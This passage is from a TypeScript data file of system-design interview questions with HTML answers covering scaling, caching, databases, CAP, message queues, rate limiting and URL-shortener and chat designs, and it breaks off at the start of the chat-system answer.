// Interview data: system-design, microservices, security-jwt, design-patterns, algorithms
// Auto-generated from pv.html
import type { PvTopic } from '../types';

export const topics: PvTopic[] = [
  {
    id: 'system-design',
    name: 'System Design',
    icon: '🏗️',
    questions: [
      {
        q: 'What is System Design and why does it matter in interviews?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>Honestly, system design is less about knowing the one "right" architecture and more about showing structured thinking under ambiguity. I always start by pinning down requirements and scale — reads vs writes, QPS, data size — before I draw a single box, because the numbers dictate the design. The real signal interviewers want is how I reason about tradeoffs: consistency vs availability, cost vs latency, simplicity vs scale. My anchor is to design for the actual load, not Google-scale when you have a thousand users. The classic trap is reaching for buzzwords like Kafka and sharding before I've justified why.</p></div>
<p><strong>System Design</strong> is the process of defining the architecture, components, and data flow of a large-scale software system. It answers: <em>"How would you build X to handle millions of users?"</em></p>
<p><strong>Think of it like building a city:</strong></p>
<ul>
<li>You need roads (networks), buildings (servers), water pipes (data flow), traffic lights (load balancers).</li>
<li>You can't just build one huge building — you need to plan for growth, failures, and traffic jams.</li>
</ul>
<p><strong>Example:</strong> If someone asks "Design Twitter", you'd think about:</p>
<ul>
<li>Where do tweets get stored? (Database)</li>
<li>How do millions of people see tweets fast? (Caching, CDN)</li>
<li>What if one server crashes? (Redundancy)</li>
</ul>
<div class="key-point">In interviews, they don't expect a perfect answer — they want to see how you <strong>think through trade-offs</strong> and break a big problem into smaller pieces.</div>`,
      },
      {
        q: 'What is Horizontal Scaling vs Vertical Scaling?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>Vertical is throwing a bigger box at the problem; horizontal is throwing more boxes. I reach for vertical first because it's dead simple — no distributed-systems tax — and modern hardware goes surprisingly far, but it hits a hard ceiling and leaves you with a single point of failure. Horizontal scales almost without limit and gives you redundancy, but it forces services to be stateless and pushes complexity into load balancing and data consistency. My rule is: scale up until it hurts, then scale out. The real gotcha is that horizontal scaling only works if your app is stateless — local state and sticky sessions are what bite teams.</p></div>
<p><strong>Vertical Scaling (Scale Up)</strong> = Make one machine more powerful (more CPU, RAM).</p>
<p><strong>Horizontal Scaling (Scale Out)</strong> = Add more machines to share the work.</p>
<p><strong>Restaurant analogy:</strong></p>
<ul>
<li><strong>Vertical</strong>: Hire a super-fast chef who can cook 10x faster → but there's a limit to how fast one person can be.</li>
<li><strong>Horizontal</strong>: Hire 10 normal chefs → you can keep adding more as orders grow.</li>
</ul>
<pre>Vertical:   1 server (32GB RAM) → 1 server (256GB RAM)
Horizontal: 1 server → 10 servers behind a load balancer</pre>
<table><tr><th>Aspect</th><th>Vertical</th><th>Horizontal</th></tr>
<tr><td>Cost</td><td>Expensive (bigger hardware)</td><td>Cheaper (commodity servers)</td></tr>
<tr><td>Limit</td><td>Has a ceiling</td><td>Nearly unlimited</td></tr>
<tr><td>Downtime</td><td>Need to restart</td><td>No downtime (add servers)</td></tr>
<tr><td>Complexity</td><td>Simple</td><td>Need load balancer, sync</td></tr></table>
<div class="key-point">Most real-world systems use <strong>horizontal scaling</strong> because it has no hard ceiling. Netflix, Google, Amazon all scale horizontally.</div>`,
      },
      {
        q: 'What is a Load Balancer and how does it work?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>A load balancer spreads traffic across servers so no one box gets hammered, and just as importantly it's the health-check gatekeeper that stops routing to dead instances. The decision I care about is L4 vs L7: L4 is fast and dumb (IP and port), while L7 reads the HTTP request so it can route by path or host and terminate TLS. For stateless services round-robin or least-connections is fine; the moment you need sessions, use a shared store like Redis rather than sticky IP-hash. And the classic gotcha is that the balancer itself is a single point of failure, so you run it as an active-passive pair.</p></div>
<p>A <strong>Load Balancer</strong> distributes incoming traffic across multiple servers so no single server gets overwhelmed.</p>
<p><strong>Analogy:</strong> Think of a restaurant host who directs customers to different tables/waiters evenly, so no single waiter is overloaded.</p>
<pre>         Client Requests
               |
        [Load Balancer]
        /      |      \\
   Server1  Server2  Server3</pre>
<p><strong>Common algorithms:</strong></p>
<ul>
<li><strong>Round Robin</strong>: Send to each server in turn (1→2→3→1→2→3…)</li>
<li><strong>Least Connections</strong>: Send to the server with fewest active connections.</li>
<li><strong>IP Hash</strong>: Same user always goes to the same server (useful for sessions).</li>
<li><strong>Weighted</strong>: Powerful servers get more traffic.</li>
</ul>
<p><strong>Layer 4 vs Layer 7 load balancing:</strong></p>
<ul>
<li><strong>L4 (transport)</strong> — routes by IP address and TCP/UDP port only, without looking at the request content. Extremely fast and protocol-agnostic, but can't decide based on URL or headers. (AWS NLB, HAProxy in TCP mode.)</li>
<li><strong>L7 (application)</strong> — reads the HTTP request, so it can route by URL path, host, headers, or cookies (<code>/api/*</code> → API servers, <code>/images/*</code> → static servers), terminate SSL, and do content-based routing. Slightly slower, far smarter. (Nginx, AWS ALB.)</li>
</ul>
<p><strong>Example:</strong> When you visit google.com, your request hits a load balancer that routes you to one of thousands of servers — you never know which one.</p>
<div class="key-point">Popular tools: <strong>Nginx</strong>, <strong>HAProxy</strong>, <strong>AWS ALB (L7) / NLB (L4)</strong>. Make the balancer itself redundant (active-passive pair) — otherwise it's a single point of failure. For sticky sessions, prefer a shared session store (Redis) over IP-hash stickiness, so any server can serve any user.</div>`,
      },
      {
        q: 'What is Caching and why is it important in system design?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>Caching trades staleness for speed and load reduction — that's the whole deal. I default to cache-aside with LRU eviction and a bounded TTL because it's simple and only caches what's actually requested. The genuinely hard problem, as the joke goes, is invalidation: keeping the cache in sync when the source changes, or you serve stale data. I always plan for the cache stampede when a hot key expires. And a cache is a performance optimization, not a system of record — the design has to survive the cache being cold or down.</p></div>
<p><strong>Caching</strong> = storing frequently used data in a fast-access location so you don't have to fetch it from the slow source every time.</p>
<p><strong>Analogy:</strong> Instead of going to the library every time you need a recipe, you photocopy your favorite recipes and keep them on your fridge (cache). Much faster!</p>
<pre>Without cache:  User → Server → Database (slow, every time)
With cache:     User → Server → Cache (fast!) → DB only if not in cache</pre>
<p><strong>Where you can cache (layers):</strong></p>
<ul>
<li><strong>Client-side</strong>: Browser cache (images, CSS, JS files)</li>
<li><strong>CDN cache</strong>: Static files served from servers near the user</li>
<li><strong>Application cache</strong>: Redis / Memcached storing DB query results</li>
<li><strong>Database cache</strong>: Query cache / buffer pool built into the DB</li>
</ul>
<p><strong>Caching strategies (how reads &amp; writes interact with the cache):</strong></p>
<ul>
<li><strong>Cache-aside (lazy loading)</strong> — the app checks the cache; on a miss it reads the DB and populates the cache. Most common. Only requested data is cached, but the first read is always a miss.</li>
<li><strong>Read-through</strong> — the cache layer itself loads from the DB on a miss (the app only talks to the cache). Same effect as cache-aside, less app code.</li>
<li><strong>Write-through</strong> — writes go to the cache AND the DB synchronously. Cache is always fresh, but writes are slower.</li>
<li><strong>Write-back (write-behind)</strong> — write to the cache, flush to the DB asynchronously later. Fast writes, but risk of data loss if the cache dies before flushing.</li>
<li><strong>Write-around</strong> — writes skip the cache and go straight to the DB (cache is filled only on read). Good when freshly written data isn't re-read soon.</li>
</ul>
<p><strong>Eviction policies (what to drop when the cache is full):</strong></p>
<ul>
<li><strong>LRU (Least Recently Used)</strong> — evict the item untouched the longest. The usual default.</li>
<li><strong>LFU (Least Frequently Used)</strong> — evict the least-accessed item.</li>
<li><strong>FIFO</strong> — evict the oldest inserted item.</li>
<li><strong>TTL</strong> — every entry expires after a set time regardless of use.</li>
</ul>
<p><strong>Example:</strong> Instagram caches popular user profiles in Redis. Instead of hitting the database for Cristiano Ronaldo's profile 1 million times/second, they read it from cache in <strong>&lt;1ms</strong>.</p>
<div class="key-point">Cache is not free — the two hard parts are <strong>invalidation</strong> (keeping cached data in sync when the source changes, or you serve stale reads) and picking the right <strong>strategy + eviction + TTL</strong>. Sensible default: cache-aside + LRU + a bounded TTL. Watch for the <strong>cache stampede</strong> when a hot key expires (covered separately).</div>`,
      },
      {
        q: 'What is a CDN (Content Delivery Network)?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>A CDN pushes static content to edge servers close to users, so you cut latency by geography and offload traffic from your origin. Beyond images and video I use it for anything cacheable, and modern CDNs also give you TLS termination, DDoS absorption, and even edge compute. The knobs that matter are cache-control headers and TTLs, plus a cache-busting strategy like versioned filenames so users aren't stuck with stale assets. The gotcha is accidentally caching something dynamic or user-specific — that's how one user ends up seeing another's data.</p></div>
<p>A <strong>CDN</strong> is a network of servers distributed around the world that serve static content (images, videos, CSS, JS) from a location <strong>close to the user</strong>.</p>
<p><strong>Analogy:</strong> Instead of one pizza shop serving the whole city, you open branches in every neighborhood. Customers get pizza faster because the shop is nearby.</p>
<pre>Without CDN:
  User in Tokyo → Server in New York (200ms latency)

With CDN:
  User in Tokyo → CDN edge server in Tokyo (20ms latency)</pre>
<p><strong>How it works:</strong></p>
<ol>
<li>User requests an image</li>
<li>CDN checks its edge server → if the file is cached, serve it immediately</li>
<li>If not cached (cache miss), fetch from the origin server, cache it, and serve</li>
</ol>
<p><strong>Example:</strong> Netflix uses its own CDN (Open Connect) with servers in ISP data centers worldwide. When you stream a movie, the video comes from a server in your city, not from Netflix HQ.</p>
<div class="key-point">Popular CDNs: <strong>CloudFlare</strong>, <strong>AWS CloudFront</strong>, <strong>Akamai</strong>. Use CDN for any static content to dramatically reduce latency.</div>`,
      },
      {
        q: 'What is a Database Index and how does it speed up queries?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>An index is a sorted lookup structure — usually a B-tree — that turns a full table scan into a logarithmic seek. The tradeoff people forget is that indexes aren't free: every write has to maintain them and they cost disk, so I index for actual query patterns, not every column. I think in terms of composite indexes and column order (the leftmost-prefix rule) and covering indexes that answer a query from the index alone. The classic gotcha is a function or type mismatch in the <code>WHERE</code> clause silently disabling the index — always confirm with <code>EXPLAIN</code>.</p></div>
<p>A <strong>database index</strong> is a data structure (usually B-Tree or Hash) that helps the database find rows quickly without scanning every row.</p>
<p><strong>Analogy:</strong> Think of the index at the back of a textbook. Instead of reading the entire book to find "Photosynthesis", you look it up in the index, get the page number, and go directly there.</p>
<pre>Without index: SELECT * FROM users WHERE email = 'john@mail.com'
  → Scans all 10 million rows (slow!)

With index on email: 
  → Looks up B-Tree, finds row in ~20 comparisons (instant!)</pre>
<p><strong>Trade-offs:</strong></p>
<ul>
<li><strong>Pro</strong>: Reads become much faster (O(log n) instead of O(n))</li>
<li><strong>Con</strong>: Writes become slightly slower (index must be updated)</li>
<li><strong>Con</strong>: Uses extra disk space</li>
</ul>
<p><strong>Example:</strong> An e-commerce site indexes <code>product_name</code>, <code>category</code>, and <code>price</code> columns because users search/filter by those constantly.</p>
<div class="key-point">Rule of thumb: Index columns that appear in <code>WHERE</code>, <code>JOIN</code>, and <code>ORDER BY</code> clauses. Don't over-index — each index slows down writes.</div>`,
      },
      {
        q: 'Explain SQL vs NoSQL databases. When would you choose each?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>My default is SQL — I want ACID, joins, and a schema until I have a concrete reason not to. I reach for NoSQL when the access pattern is clear and one factor dominates: massive horizontal write scale, a flexible evolving schema, or a specific shape like document, key-value, or graph. The mental shift with NoSQL is that you model around queries up front instead of normalizing, because there are no joins. And it's rarely either/or — polyglot persistence is normal: Postgres for core data, Redis for cache, Elasticsearch for search. The gotcha is picking NoSQL for "scale" you'll never reach and throwing away transactions you actually needed.</p></div>
<p><strong>SQL (Relational)</strong>: Structured tables with rows/columns, enforces schema, uses SQL language. E.g., MySQL, PostgreSQL.</p>
<p><strong>NoSQL</strong>: Flexible schema, stores data as documents/key-value/graph/column. E.g., MongoDB, Redis, Cassandra.</p>
<p><strong>Analogy:</strong></p>
<ul>
<li><strong>SQL</strong> = Filing cabinet with labeled folders. Everything is organized in a fixed structure. Great when you know exactly what your data looks like.</li>
<li><strong>NoSQL</strong> = A big box where you can throw in anything — notes, photos, receipts. Flexible but less organized.</li>
</ul>
<pre>SQL (Users table):
| id | name  | email          |
|----|-------|----------------|
| 1  | John  | john@mail.com  |

NoSQL (MongoDB document):
{ _id: 1, name: "John", email: "john@mail.com",
  hobbies: ["chess", "coding"], address: { city: "NYC" } }</pre>
<p><strong>The four types of NoSQL (they are NOT one thing):</strong></p>
<ul>
<li><strong>Document</strong> (MongoDB, Couchbase) — JSON-like documents with flexible nested data. Great for catalogs, user profiles, content.</li>
<li><strong>Key-Value</strong> (Redis, DynamoDB) — a giant hash map; the fastest possible lookup by key. Great for caching, sessions, counters.</li>
<li><strong>Wide-Column</strong> (Cassandra, HBase) — rows with dynamic columns, tuned for huge write volume and range scans. Great for time-series, logs, IoT.</li>
<li><strong>Graph</strong> (Neo4j, Neptune) — nodes + edges, optimized for traversing relationships. Great for social networks, recommendations, fraud detection.</li>
</ul>
<table><tr><th>Use SQL when</th><th>Use NoSQL when</th></tr>
<tr><td>Data has clear relationships (orders ↔ users)</td><td>Data structure changes often</td></tr>
<tr><td>Need ACID transactions (banking)</td><td>Need massive horizontal scaling</td></tr>
<tr><td>Complex queries with JOINs</td><td>High write throughput (IoT, logs)</td></tr></table>
<div class="key-point">Many systems use <strong>both</strong>: SQL for core data (users, payments) + NoSQL for flexible data (user activity logs, product catalogs).</div>`,
      },
      {
        q: 'What is Database Sharding?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Sharding is horizontal partitioning across machines — you split data so each node holds a slice, which lets you scale writes past a single box. The whole game is the shard key: it has to spread load evenly and match your query patterns, or you get hot shards and cross-shard queries that kill you. I avoid sharding as long as I can because it's largely one-way — resharding is painful — so read replicas and caching come first. Range keys are simple but hotspot; hash spreads well but kills range scans; consistent hashing eases rebalancing. The big gotcha is that cross-shard joins and transactions basically disappear.</p></div>
<p><strong>Sharding</strong> = splitting a large database into smaller pieces (shards), each stored on a different server.</p>
<p><strong>Analogy:</strong> Imagine a library with 1 million books on one shelf — finding a book is slow. Instead, split books by genre: Fiction in Room A, Science in Room B, History in Room C. Each room is a "shard".</p>
<pre>Before sharding (1 big DB):
  All 100M users → one database server (bottleneck!)

After sharding:
  Users A-M → Shard 1 (Server 1)
  Users N-Z → Shard 2 (Server 2)</pre>
<p><strong>Sharding strategies:</strong></p>
<ul>
<li><strong>Range-based</strong>: Shard by user ID ranges (1-1M → shard1, 1M-2M → shard2)</li>
<li><strong>Hash-based</strong>: hash(user_id) % num_shards → even distribution</li>
<li><strong>Geography-based</strong>: US users → US shard, EU users → EU shard</li>
</ul>
<p><strong>Example:</strong> Instagram shards its PostgreSQL database by user ID. Each shard handles a subset of users, allowing them to scale to billions of photos.</p>
<div class="key-point">Sharding adds complexity: cross-shard queries are hard, rebalancing shards is painful. Only shard when a single database can't handle the load.</div>`,
      },
      {
        q: 'What is Database Replication?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Replication keeps copies of your data on multiple nodes, and it buys you two things: read scaling and failover durability. The core choice is synchronous vs asynchronous — sync means no data loss but adds write latency and can stall if a replica lags, while async is fast but you can lose the last few writes on failover. Single-leader is the common default: writes hit the primary, reads fan out to replicas, and the gotcha there is replication lag causing read-your-own-writes bugs. Multi-leader and leaderless exist but bring conflict resolution, which is a real jump in complexity.</p></div>
<p><strong>Replication</strong> = keeping copies of the same database on multiple servers.</p>
<p><strong>Analogy:</strong> Instead of one copy of a popular book in the library, keep 5 copies. More people can read it at the same time, and if one copy is damaged, others are still available.</p>
<pre>Master-Slave Replication:
  [Master DB] ──writes──→  [Slave 1] (read-only copy)
       |                   [Slave 2] (read-only copy)
       |                   [Slave 3] (read-only copy)
  (handles writes)       (handle reads)</pre>
<p><strong>Types:</strong></p>
<ul>
<li><strong>Master-Slave</strong>: One master (writes) + multiple slaves (reads). Most common.</li>
<li><strong>Master-Master</strong>: Multiple masters can accept writes. More complex, risk of conflicts.</li>
</ul>
<p><strong>Benefits:</strong></p>
<ul>
<li><strong>Better read performance</strong>: Spread reads across replicas</li>
<li><strong>High availability</strong>: If master dies, promote a slave</li>
<li><strong>Data safety</strong>: Multiple copies = protection against data loss</li>
</ul>
<p><strong>Example:</strong> A news site gets 95% reads, 5% writes. The master handles writes, and 4 read replicas handle the flood of readers. If the master crashes, one replica is promoted within seconds.</p>
<div class="key-point">Watch out for <strong>replication lag</strong>: a write to master may take a few milliseconds to appear on slaves. This can cause "I just updated my profile but still see the old one" bugs.</div>`,
      },
      {
        q: 'What is the CAP Theorem?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>The pop version — pick two of three — is misleading. Partitions aren't something you choose; on a real network they happen, so the actual decision is: when a partition occurs, do you sacrifice consistency or availability? CP means you refuse writes to stay correct (banking, inventory); AP means you keep serving and reconcile later (carts, social feeds). In the happy path with no partition you get both C and A, which is why PACELC extends it — even without partitions you trade latency vs consistency. I always frame it per-operation, because one system can be CP for payments and AP for the feed.</p></div>
<p>The <strong>CAP Theorem</strong> states that a distributed system can only guarantee <strong>2 out of 3</strong> properties at the same time:</p>
<ul>
<li><strong>C</strong>onsistency – Every read gets the most recent write (all nodes see the same data)</li>
<li><strong>A</strong>vailability – Every request gets a response (even if it might not be the latest data)</li>
<li><strong>P</strong>artition Tolerance – System works even when network between nodes breaks</li>
</ul>
<p><strong>Analogy:</strong> Imagine 2 friends (Node A and Node B) who share a phone book:</p>
<ul>
<li>Someone updates a phone number on Node A</li>
<li>The phone line between A and B goes down (partition!)</li>
<li>Node B gets asked for the number. You can either:</li>
<li><strong>CP</strong>: Refuse to answer until B talks to A (consistent but unavailable)</li>
<li><strong>AP</strong>: Give the old number (available but inconsistent)</li>
</ul>
<pre>CP systems: MongoDB, HBase, Redis Cluster
  → "I'd rather give no answer than a wrong answer"

AP systems: Cassandra, DynamoDB, CouchDB
  → "I'd rather give a possibly-stale answer than no answer"

CA systems: Traditional single-node RDBMS (no partition tolerance)
  → Only works when there's no network partition (single machine)</pre>
<div class="key-point">In real distributed systems, <strong>P (partition tolerance) is mandatory</strong> — networks WILL fail. So in practice, you choose between <strong>CP</strong> or <strong>AP</strong>.</div>`,
      },
      {
        q: 'What is an API Gateway?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>An API gateway is the single front door to your services, and its job is to centralize the cross-cutting concerns you don't want each service reimplementing: auth, rate limiting, TLS termination, routing, request aggregation, and observability. That keeps services focused on business logic. The tradeoff is another hop and, if you're careless, a single point of failure and a deployment bottleneck — so you run it redundantly and keep business logic out of it. I distinguish it from a plain load balancer: the gateway is L7 and application-aware. The anti-pattern is letting it grow into an ESB with orchestration baked in.</p></div>
<p>An <strong>API Gateway</strong> is a single entry point that sits between clients and your backend microservices. All requests go through it first.</p>
<p><strong>Analogy:</strong> Think of a hotel receptionist. Guests don't walk directly to the kitchen, laundry, or housekeeping. They tell the receptionist what they need, and the receptionist routes the request to the right department.</p>
<pre>Without API Gateway:
  Mobile App → User Service
  Mobile App → Order Service
  Mobile App → Payment Service
  (client must know all service URLs)

With API Gateway:
  Mobile App → [API Gateway] → User Service
                             → Order Service
                             → Payment Service
  (client only knows one URL)</pre>
<p><strong>What it does:</strong></p>
<ul>
<li><strong>Routing</strong>: Sends /users to User Service, /orders to Order Service</li>
<li><strong>Authentication</strong>: Validates JWT/API keys before forwarding</li>
<li><strong>Rate Limiting</strong>: Prevents abuse (max 100 requests/minute)</li>
<li><strong>Response Aggregation</strong>: Combines data from multiple services into one response</li>
<li><strong>SSL Termination</strong>: Handles HTTPS so backend services don't have to</li>
</ul>
<p><strong>Example:</strong> Netflix's Zuul API Gateway handles billions of requests/day, routing them to hundreds of microservices.</p>
<div class="key-point">Popular tools: <strong>Kong</strong>, <strong>AWS API Gateway</strong>, <strong>Nginx</strong>, <strong>Spring Cloud Gateway</strong>.</div>`,
      },
      {
        q: 'What is a Message Queue and when should you use one?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>A message queue decouples producers from consumers in time — the producer fires and forgets, the consumer processes at its own pace. I use it for three things: smoothing traffic spikes by buffering, doing slow work asynchronously like emails or image processing, and decoupling services so one can be down without dragging others with it. The costs are added latency, eventual consistency, and having to handle duplicate or out-of-order delivery — so consumers must be idempotent. Key decisions are at-least-once vs at-most-once, and a plain queue (SQS, RabbitMQ) vs a log (Kafka) when you need replay. The gotcha everyone hits is needing a dead-letter queue for poison messages.</p></div>
<p>A <strong>Message Queue</strong> is a system where producers send messages and consumers process them asynchronously. The queue holds messages until they are processed.</p>
<p><strong>Analogy:</strong> A coffee shop. You (producer) place an order and get a receipt number. You sit down and wait. The barista (consumer) picks orders from the queue and makes coffee one by one. You don't block the line waiting for your coffee.</p>
<pre>Synchronous (without queue):
  User → Place Order → Wait for email... → Wait for invoice... → Done (slow!)

Asynchronous (with queue):
  User → Place Order → Done! (instant response)
     [Queue]: "Send email" → Email service picks it up
     [Queue]: "Generate invoice" → Invoice service picks it up</pre>
<p><strong>When to use:</strong></p>
<ul>
<li><strong>Decoupling services</strong>: Order service doesn't need to know about Email service</li>
<li><strong>Handling spikes</strong>: Queue absorbs bursts of traffic</li>
<li><strong>Retry on failure</strong>: If email service is down, message stays in queue</li>
<li><strong>Background jobs</strong>: Image resizing, report generation, notifications</li>
</ul>
<p><strong>Two messaging models:</strong></p>
<ul>
<li><strong>Queue (point-to-point)</strong>: each message is delivered to exactly ONE consumer. Add more consumers to share the load (competing consumers). E.g. SQS, RabbitMQ queues.</li>
<li><strong>Pub/Sub (publish-subscribe)</strong>: each message is delivered to ALL subscribers — every interested service gets its own copy. E.g. Kafka topics, SNS, RabbitMQ fanout.</li>
</ul>
<p><strong>Delivery guarantees (a common follow-up):</strong></p>
<ul>
<li><strong>At-most-once</strong>: fire and forget; may lose messages. Rarely acceptable.</li>
<li><strong>At-least-once</strong>: retried until acknowledged; may deliver duplicates → consumers must be <strong>idempotent</strong>. The practical default.</li>
<li><strong>Exactly-once</strong>: no loss, no duplicates — very hard in practice; usually emulated with at-least-once + deduplication (covered separately).</li>
</ul>
<p><strong>Queue vs log</strong>: a classic queue (RabbitMQ/SQS) deletes a message once it's consumed; a log (Kafka) keeps messages for a retention period, so multiple consumers can read at their own pace and replay history.</p>
<p><strong>Example:</strong> When you upload a video to YouTube, it responds instantly with "Processing...". The actual encoding runs asynchronously via a message queue across many servers.</p>
<div class="key-point">Popular tools: <strong>RabbitMQ</strong>, <strong>Apache Kafka</strong>, <strong>AWS SQS</strong>, <strong>Redis Streams</strong>.</div>`,
      },
      {
        q: 'What is the difference between Monolith and Microservices architecture?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>I almost always start with a monolith — ideally a well-modularized one — because microservices solve organizational and scaling problems you probably don't have yet, and they cost you dearly: network calls, distributed transactions, ops overhead, and debugging across boundaries. Microservices win when you have multiple teams needing independent deploys or components with wildly different scaling profiles. The classic failure mode is splitting too early and ending up with a distributed monolith — all the pain, none of the benefit. My line is: modular monolith first, extract services along real seams once the pain is concrete.</p></div>
<p><strong>Monolith</strong> = entire application is one big deployable unit.</p>
<p><strong>Microservices</strong> = application is split into small, independent services, each doing one thing.</p>
<p><strong>Analogy:</strong></p>
<ul>
<li><strong>Monolith</strong> = Swiss Army knife: one tool does everything. Simple to carry, but if the scissors break, you can't use the knife either.</li>
<li><strong>Microservices</strong> = Toolbox: separate screwdriver, hammer, wrench. Each can be replaced independently.</li>
</ul>
<pre>Monolith:
  [One Big App: Users + Orders + Payments + Notifications]
  → One deploy, one database, one codebase

Microservices:
  [User Service] ←→ [Order Service] ←→ [Payment Service]
       |                                      |
  [User DB]                              [Payment DB]</pre>
<table><tr><th>Aspect</th><th>Monolith</th><th>Microservices</th></tr>
<tr><td>Deployment</td><td>All or nothing</td><td>Deploy each service independently</td></tr>
<tr><td>Scaling</td><td>Scale everything together</td><td>Scale only what's needed</td></tr>
<tr><td>Complexity</td><td>Simple at first</td><td>Complex (networking, monitoring)</td></tr>
<tr><td>Team size</td><td>Small teams</td><td>Large teams (each owns a service)</td></tr></table>
<div class="key-point">Start with a monolith, then extract microservices as the system grows. Don't start with microservices for a small project — it's over-engineering.</div>`,
      },
      {
        q: 'What is Rate Limiting and how do you implement it?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Rate limiting protects you from abuse, runaway clients, and cost blowups, and it enforces basic fairness between tenants. Algorithm-wise I default to token bucket because it allows bursts while capping the average rate; sliding window is more precise but heavier; fixed window is simplest but has the boundary-spike problem. In a distributed setup the real challenge is shared state, so you centralize counters in Redis with atomic operations and accept a little accuracy loss. I always return <code>429</code> with a <code>Retry-After</code> header so clients back off gracefully. The gotcha is keying it wrong — per-IP breaks behind NAT and proxies, so key per API key or user where you can.</p></div>
<p><strong>Rate Limiting</strong> = controlling how many requests a user/client can make in a given time window.</p>
<p><strong>Analogy:</strong> A theme park ride allows only 20 people per 5 minutes. If more people come, they wait in line. This prevents overcrowding (server overload).</p>
<p><strong>Common algorithms:</strong></p>
<ul>
<li><strong>Fixed Window</strong>: Count requests in fixed time windows (e.g., 100 requests per minute starting at :00)</li>
<li><strong>Sliding Window</strong>: Smooth version of fixed window, avoids burst at window edges</li>
<li><strong>Token Bucket</strong>: A bucket fills with tokens at a fixed rate. Each request takes a token. No tokens = rejected. Allows short bursts.</li>
<li><strong>Leaky Bucket</strong>: Requests queue up and are processed at a constant rate. Smooths traffic.</li>
</ul>
<pre>Token Bucket Example:
  Bucket capacity: 10 tokens
  Refill rate: 2 tokens/second

  Request 1-10: ✅ (10 tokens used)
  Request 11: ❌ 429 Too Many Requests (bucket empty)
  After 1 second: 2 new tokens available
  Request 12-13: ✅</pre>
<p><strong>Example:</strong> Twitter API allows 300 tweets per 3 hours per user. GitHub API allows 5000 requests per hour per authenticated user.</p>
<div class="key-point">Implement at the <strong>API Gateway level</strong> using Redis to track counters. Return HTTP <code>429 Too Many Requests</code> when limit is exceeded.</div>`,
      },
      {
        q: 'What is Consistent Hashing and why is it used?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>Consistent hashing solves the resharding nightmare: with plain <code>hash(key) % N</code>, changing N remaps almost every key. Consistent hashing places nodes and keys on a ring, so adding or removing a node only moves the keys near it — about 1/N of the data — instead of everything. The refinement that makes it actually work is virtual nodes: each physical node gets many points on the ring so load stays even and you avoid hotspots. It's the backbone of Dynamo, Cassandra, and distributed caches. The gotcha it doesn't solve on its own is uneven load from hot keys, which still needs replication or bounded loads.</p></div>
<p><strong>Consistent Hashing</strong> is a technique for distributing data across servers such that when a server is added or removed, only a minimal amount of data needs to move.</p>
<p><strong>Problem with simple hashing:</strong></p>
<pre>server = hash(key) % N   (N = number of servers)
If N changes (add/remove server), ALMOST ALL keys get remapped! 💀</pre>
<p><strong>Analogy:</strong> Imagine 4 people sitting in a circle, and you assign tasks by pointing a spinner. If person 2 leaves, only their tasks move to the next person. Everyone else keeps their tasks.</p>
<pre>Consistent Hashing Ring:
      0°
      |
  [Server A]--90°
      |         |
 270°--[Server C]
      |         |
  [Server B]--180°

Key "user123" hashes to 120° → goes to Server B (next server clockwise)
If Server B is removed → key goes to Server C (minimal disruption)</pre>
<p><strong>Key benefit</strong>: When adding/removing a server, only <strong>K/N</strong> keys need to move (K = total keys, N = servers), instead of almost ALL keys.</p>
<p><strong>Example:</strong> Amazon DynamoDB uses consistent hashing to distribute data across nodes. When a new node joins, only its neighbors' data is partially moved.</p>
<div class="key-point">Used in: <strong>Memcached</strong>, <strong>DynamoDB</strong>, <strong>Cassandra</strong>, <strong>load balancers</strong>. Essential for any distributed cache or database.</div>`,
      },
      {
        q: 'How would you design a URL Shortener (like bit.ly)?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>This one is really a distributed-ID and read-heavy key-value problem in disguise. The core is generating a short unique key — I'd base62-encode a counter (or hand each node a pre-allocated key range) rather than hashing the URL, since hashing invites collisions. It's overwhelmingly read-heavy, so the design is a simple KV store for the mapping plus aggressive caching and a CDN in front of the redirect. I'd choose <code>301</code> vs <code>302</code> deliberately — 302 if I want click analytics. The real gotchas are custom aliases, expiration, and keeping key generation collision-free without a central bottleneck.</p></div>
<p>A URL shortener converts long URLs to short ones (e.g., <code>bit.ly/abc123</code>) and redirects users to the original URL.</p>
<p><strong>Step-by-step design:</strong></p>
<p><strong>1. Core flow:</strong></p>
<pre>Create:  POST /shorten { url: "https://very-long-url.com/..." }
         → Returns: "https://short.ly/abc123"

Redirect: GET /abc123
         → 301 Redirect to "https://very-long-url.com/..."</pre>
<p><strong>2. How to generate short codes:</strong></p>
<ul>
<li>Use Base62 encoding (a-z, A-Z, 0-9) = 62 characters</li>
<li>6 characters = 62^6 = <strong>56 billion</strong> unique URLs</li>
<li>Auto-increment ID → convert to Base62</li>
</ul>
<pre>ID: 12345 → Base62: "dnh"
ID: 999999999 → Base62: "15FTGf"</pre>
<p><strong>3. Database:</strong></p>
<pre>Table: urls
| id (PK) | short_code | original_url | created_at |</pre>
<p><strong>4. Scaling:</strong></p>
<ul>
<li><strong>Cache</strong>: Redis cache for popular URLs (99% reads)</li>
<li><strong>Database</strong>: Shard by short_code hash</li>
<li><strong>Rate limit</strong>: Prevent spam/abuse</li>
</ul>
<div class="key-point">Read-to-write ratio is ~100:1, so cache aggressively. Use <strong>301 (permanent)</strong> redirect for SEO or <strong>302 (temporary)</strong> if you want to track analytics.</div>`,
      },
      {
        q: 'How would you design a Chat System (like WhatsApp/Slack)?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>The heart of chat is a persistent connection — WebSockets — so the server can push messages instead of clients polling. The tricky part is that users connect to different servers, so you need to route a message to whichever server holds the recipient's connection: a pub/sub layer (Redis or Kafka) plus a session registry mapping user to server. Messages are persisted for history and offline delivery in a write-heavy store partitioned by conversation. I'd design delivery and read receipts with acks and handle presence via heartbeats. The gotchas are per-conversation ordering, fan-out for large group chats, and reconnection backfill after a drop.</p></div>
<p>A real-time chat system requires instant message delivery, presence (online/offline), and message persistence.</p>
